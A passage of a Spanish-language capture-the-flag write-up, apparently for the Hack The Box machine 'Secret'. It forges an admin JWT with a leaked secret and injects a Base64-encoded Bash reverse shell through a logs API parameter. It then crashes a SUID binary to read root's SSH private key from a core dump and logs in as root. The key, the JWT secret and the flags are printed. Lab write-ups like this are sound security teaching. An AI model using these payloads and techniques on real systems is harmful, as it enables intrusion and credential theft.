</code></pre></div><p>Y ahora tenemos este secreto tan largo que debe ser el que se utiliza en la API. Entonces, podemos crear un <em>token</em> JWT utilizando este secreto:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>&gt; jwt.sign({ _id: '1337', name: 'theadmin', email: 'root@dasith.works' }, 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE')  
<span class=code-dark-green>'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiIxMzM3IiwibmFtZSI6InRoZWFkbWluIiwiZW1haWwiOiJyb290QGRhc2l0aC53b3JrcyIsImlhdCI6MTYzNjE0MDg0MX0.1VxXuW13J_naXwUAKEPe5O2EMo5GXljVslevhsg4cCQ'</span>
</code></pre></div><h2 id=acceso-a-la-máquina>Acceso a la máquina</h2><p>En este punto, podemos explotar la vulnerabilidad de inyección de comandos y conseguir una conexión con la máquina. Para ello, podemos utilizar un <em>payload</em> típico de una <em>reverse shell</em> en Bash, pero codificado en Base64 para evitar problemas de caracteres:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> -n <span class=code-dark-yellow>'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class=code-dark-green>base64</span>  
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
</code></pre></div><p>Con esto, explotamos la inyección de comandos añadiendo un punto y coma y después el comando (nótese que <code>+</code> es un espacio en codificación de URL):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-yellow>'10.10.11.120/api/logs?file=;+echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx+|+base64+-d+|+bash'</span> -H <span class=code-dark-yellow>'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiIxMzM3IiwibmFtZSI6InRoZWFkbWluIiwiZW1haWwiOiJyb290QGRhc2l0aC53b3JrcyIsImlhdCI6MTYzNjE0MDg0MX0.1VxXuW13J_naXwUAKEPe5O2EMo5GXljVslevhsg4cCQ'</span>  
</code></pre></div><p>Y obtenemos acceso a la máquina como usuario <code>dasith</code> mediante <code>nc</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.120.
Ncat: Connection from 10.10.11.120:34952.
bash: cannot set terminal process group (1118): Inappropriate ioctl for device  
bash: no job control in this shell
dasith@secret:~/local-web$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
dasith@secret:~/local-web$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class=code-cyan>$</span> <span class=code-dark-green>stty</span> raw -echo; <span class=code-dark-green>fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
dasith@secret:~/local-web$ export SHELL=bash
dasith@secret:~/local-web$ export TERM=xterm
dasith@secret:~/local-web$ stty rows 50 columns 158
</code></pre></div><p>En este punto, ya podemos capturar la <em>flag</em> <code>user.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>dasith@secret:~/local-web$ cd
dasith@secret:~$ cat user.txt
257020bf6c2e57197510fcb6b5f4726c  
</code></pre></div><h2 id=encontrando-un-binario-suid>Encontrando un binario SUID</h2><p>Después de enumerar el sistema, encontramos un binario SUID en <code>/opt/count</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>dasith@secret:~$ find / -perm -4000 2&gt;/dev/null | grep -v snap  
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/opt/count
</code></pre></div><p>Se trata de un binario ELF:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>dasith@secret:~$ file /opt/count
/opt/count: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=615b7e12374cd1932161a6a9d9a737a63c7be09a, for GNU/Linux 3.2.0, not stripped  
</code></pre></div><p>Si se ejecuta el binario, este nos permite leer archivo como usuario <code>root</code>, pero no nos muestra el contenido del archivo leído, sino estadísticas del propio archivo (número de líneas, palabras y letras). También podemos listar el contenido de directorios como usuario <code>root</code>. Después, se puede escribir el resultado en un archivo, pero como usuario <code>dasith</code> (se degradan privilegios en este punto).</p><p>Afortunadamente, tenemos el código fuente del programa en <code>/opt/code.c</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>dasith@secret:~$ ls /opt
code.c  <span class="code-bg-red code-white">count</span>  valgrind.log  
</code></pre></div><p>No parece vulnerable a <em>Buffer Overflow</em>, <em>Format Strings</em> o <em>Library Hijacking</em>. Pero sí hay algo extraño en estas líneas:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>//</span> <span class=mtk3>drop</span> <span class=mtk3>privs</span> <span class=mtk3>to</span> <span class=mtk3>limit</span> <span class=mtk3>file</span> <span class=mtk3>write</span>  
<span class=mtk8>setuid</span><span class=mtk1>(</span><span class=mtk8>getuid</span><span class=mtk1>());</span>
<span class=mtk3>//</span> <span class=mtk3>Enable</span> <span class=mtk3>coredump</span> <span class=mtk3>generation</span>
<span class=mtk8>prctl</span><span class=mtk1>(PR_SET_DUMPABLE,</span> <span class=mtk6>1</span><span class=mtk1>);</span>
</code></pre></div><p>Este fragmento de código se ejecuta justo antes de escribir los resultados a un archivo. Esto es un fallo de configuración, ya que si se rompe el proceso, será posible leer los contenidos del <em>coredump</em> como usuario <code>dasith</code> (que contendrá el archivo leído previamente como <code>root</code>).</p><h2 id=escalada-de-privilegios>Escalada de privilegios</h2><p>Utilizando el binario, podemos ver que <code>root</code> tiene una clave privada <code>id_rsa</code> para SSH:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>dasith@secret:~$ /opt/count
Enter source file/directory name: /root
-rw-r--r--      .viminfo
drwxr-xr-x      ..
-rw-r--r--      .bashrc
drwxr-xr-x      .local
drwxr-xr-x      snap
lrwxrwxrwx      .bash_history
drwx------      .config
drwxr-xr-x      .pm2
-rw-r--r--      .profile
drwxr-xr-x      .vim
drwx------      .
drwx------      .cache
-r--------      root.txt
drwxr-xr-x      .npm
drwx------      .ssh

Total entries       = 15
Regular files       = 4
Directories         = 10
Symbolic links      = 1
Save results a file? [y/N]:
dasith@secret:~$ /opt/count
Enter source file/directory name: /root/.ssh  
drwx------      ..
-rw-------      authorized_keys
-rw-------      id_rsa
drwx------      .
-rw-r--r--      id_rsa.pub

Total entries       = 5
Regular files       = 3
Directories         = 2
Symbolic links      = 0
Save results a file? [y/N]:
</code></pre></div><p>Entonces podemos leer este archivo y romper el proceso del programa. Para ello, podemos ponerlo en segundo plano con Control-Z (<code>^Z</code>) y después utilizar <code>kill -SIGSEGV</code> indicando el identificador de proceso (PID) listado con <code>ps -a</code>. Después, traemos el programa al primer plano y vemos el mensaje &ldquo;<em>Segmentation fault (core dumped)</em>&rdquo;:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>dasith@secret:~$ /opt/count
Enter source file/directory name: /root/.ssh/id_rsa  

Total characters = 2602
Total words      = 45
Total lines      = 39
Save results a file? [y/N]: y
Path: ^Z
[1]+  Stopped                 /opt/count
dasith@secret:~$ ps -a | grep count
  47330 pts/6    00:00:00 <span class=code-red>count</span>
dasith@secret:~$ kill -SIGSEGV 47330
dasith@secret:~$ fg
/opt/count
Segmentation fault (core dumped)
</code></pre></div><p>Este error genera un archivo en <code>/var/crash</code>. Utilizando <code>apport-unpack</code> podemos extraer el archivo <code>CoreDump</code> y leer el contenido de <code>/root/.ssh/id_rsa</code> (porque fue el archivo que leímos con <code>/opt/count</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>dasith@secret:~$ ls /var/crash
_opt_count.1000.crash
dasith@secret:~$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/.crash
dasith@secret:~$ ls /tmp/.crash
Architecture  Date           ExecutablePath       ProblemType  ProcCwd      ProcMaps    Signal  UserGroups
CoreDump      DistroRelease  ExecutableTimestamp  ProcCmdline  ProcEnviron  ProcStatus  Uname
dasith@secret:~$ strings -n 32 /tmp/.crash/CoreDump
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
Please check if file exists and you have read privilege.
Enter source file/directory name:
Path: esults a file? [y/N]: l words      = 45
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
DB_CONNECT=mongodb://127.0.0.1:27017/auth-web
unique_id=4594a417-fb89-4a4a-8936-6a56a15fce32
LESSCLOSE=/usr/bin/lesspipe %s %s
TOKEN_SECRET=gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE  
pm_pid_path=/home/dasith/.pm2/pids/index-0.pid
pm_err_log_path=/home/dasith/.pm2/logs/index-error.log
pm_exec_path=/home/dasith/local-web/index.js
pm_out_log_path=/home/dasith/.pm2/logs/index-out.log
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
</code></pre></div><p>Finalmente, podemos poner la clave en un archivo y conectarnos a la máquina como <code>root</code>. Y entonces, tenemos la <em>flag</em> <code>root.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>chmod</span> 600 id_rsa

<span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> -i id_rsa root@10.10.11.120  
root@secret:~# cat /root/root.txt
90fd01f9faa29c802ad279f48224edc8
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#análisis-de-código-estático>Análisis de código estático</a></li><li><a href=#enumeración-del-proyecto-git>Enumeración del proyecto Git</a></li><li><a href=#acceso-a-la-máquina>Acceso a la máquina</a></li><li><a href=#encontrando-un-binario-suid>Encontrando un binario SUID</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>